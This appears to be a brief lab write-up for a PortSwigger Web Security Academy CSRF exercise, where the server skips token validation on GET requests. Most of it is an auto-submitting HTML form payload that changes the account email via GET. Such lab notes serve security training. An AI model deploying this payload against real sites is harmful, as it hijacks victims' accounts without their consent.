
#CSRF #CSRF-Tokens

CSRF where token validation depends on request method: [link](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

in this challenge the CSRF happen because the backend does not stop the get request to send data it's old and not exists in the new web applications

**payload :**
```
<html>

<form class="login-form" name="change-email-form" action="https://web-security-academy.net/my-account/change-email" method="GET">

<label>Email</label>

<input required="" type="email" name="email" value="newwemail@gmail.com">

<button class="button" type="submit"> Update email </button>

</form>

<script>

document.forms[0].submit()

</script>
</html>
```
